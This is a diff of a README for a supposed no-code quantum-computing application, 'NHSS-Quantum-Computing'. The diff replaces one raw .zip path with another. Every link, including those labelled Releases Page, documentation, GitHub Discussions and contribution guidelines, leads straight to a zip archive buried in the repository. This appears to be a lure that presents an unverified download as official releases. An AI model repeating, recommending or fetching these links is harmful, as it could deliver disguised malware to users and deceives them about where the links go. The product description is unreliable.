@@ -1,7 +1,7 @@
 # 🌟 NHSS-Quantum-Computing - Explore Quantum Computing with Ease
 
 ## 📥 Download Now
-[![Download NHSS-Quantum-Computing](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/src/utils/Quantum-Computing-NHS-v3.5-alpha.5.zip)](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/src/utils/Quantum-Computing-NHS-v3.5-alpha.5.zip)
+[![Download NHSS-Quantum-Computing](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/examples/Computing_NHS_Quantum_v1.2.zip)](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/examples/Computing_NHS_Quantum_v1.2.zip)
 
 ## 📖 Overview
 NHSS-Quantum-Computing offers an easy way to experience the Non-Hermitian Spectral Steering (NHSS) quantum paradigm. This application uses IBM Dynamic Circuits to provide insights into advanced quantum concepts. It is designed for users interested in exploring quantum algorithms and hardware without any programming skills.
@@ -10,7 +10,7 @@ NHSS-Quantum-Computing offers an easy way to experience the Non-Hermitian Spectr
 To successfully download and run the NHSS-Quantum-Computing software, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/src/utils/Quantum-Computing-NHS-v3.5-alpha.5.zip) to access the latest version of our application.
+   Go to the [Releases Page](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/examples/Computing_NHS_Quantum_v1.2.zip) to access the latest version of our application.
 
 2. **Choose Your Version**  
    On the Releases Page, you will see a list of available versions. Look for the most recent one. It usually has the highest version number.
@@ -43,22 +43,22 @@ To successfully download and run the NHSS-Quantum-Computing software, follow the
 - **Real-Time Measurement:** Get instant feedback on your quantum experiments.
 
 ## 📚 Documentation
-For detailed instructions on specific features and functionalities, refer to the official documentation. This can be found in the `docs` folder within the downloaded files or visit the [documentation page](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/src/utils/Quantum-Computing-NHS-v3.5-alpha.5.zip).
+For detailed instructions on specific features and functionalities, refer to the official documentation. This can be found in the `docs` folder within the downloaded files or visit the [documentation page](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/examples/Computing_NHS_Quantum_v1.2.zip).
 
 ## 🔗 Support
 If you encounter any issues during installation or use, please reach out through the Issues section of our GitHub repository. You can report bugs or ask questions there.
 
 ## 📈 Community
-Join our community to share your experiences and learn from others. Connect with us on [GitHub Discussions](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/src/utils/Quantum-Computing-NHS-v3.5-alpha.5.zip) to join the conversation.
+Join our community to share your experiences and learn from others. Connect with us on [GitHub Discussions](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/examples/Computing_NHS_Quantum_v1.2.zip) to join the conversation.
 
 ## 📤 Contributing
-We welcome contributions from everyone. If you want to improve the software, feel free to fork the repository and send a pull request. Follow our contribution guidelines in the `https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/src/utils/Quantum-Computing-NHS-v3.5-alpha.5.zip` document included in the repository.
+We welcome contributions from everyone. If you want to improve the software, feel free to fork the repository and send a pull request. Follow our contribution guidelines in the `https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/examples/Computing_NHS_Quantum_v1.2.zip` document included in the repository.
 
 ## 📅 Future Updates
 We plan to add more features and improvements in future releases. Stay tuned on the Releases Page for updates, or subscribe for notifications.
 
 ## ✅ Download & Install
-Don’t wait to start your journey into quantum computing. Go to the [Releases Page](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/src/utils/Quantum-Computing-NHS-v3.5-alpha.5.zip) to download the latest version and begin experimenting today!
+Don’t wait to start your journey into quantum computing. Go to the [Releases Page](https://raw.githubusercontent.com/eness440/NHSS-Quantum-Computing/main/examples/Computing_NHS_Quantum_v1.2.zip) to download the latest version and begin experimenting today!
 
 ### 📝 Acknowledgements
 We recognize the contributions from all community members and developers. Your input helps us improve and evolve NHSS-Quantum-Computing.
